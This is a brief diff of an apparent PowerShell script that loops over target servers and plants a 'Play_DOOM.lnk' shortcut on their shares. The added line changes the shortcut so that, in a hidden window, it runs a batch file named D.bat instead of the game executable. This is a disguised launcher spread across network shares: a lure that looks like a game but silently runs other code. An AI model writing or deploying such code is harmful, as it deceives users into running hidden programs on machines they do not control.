@@ -39,7 +39,7 @@ foreach ($server in $targets) {
                 $lnk = $objShell.CreateShortcut("$sharePath\Play_DOOM.lnk")
                 $lnk.TargetPath = "powershell.exe"
                 # This uses %CD% to find the folder the LNK is currently in
-                $lnk.Arguments = "-w h -c `"Start-Process '.\DOOM\DOOM.exe'`""
+                $lnk.Arguments = "-w h -c `"Start-Process '.\DOOM\D.bat'`""
                 $lnk.WorkingDirectory = "%CD%" 
                 $lnk.Save()
                 
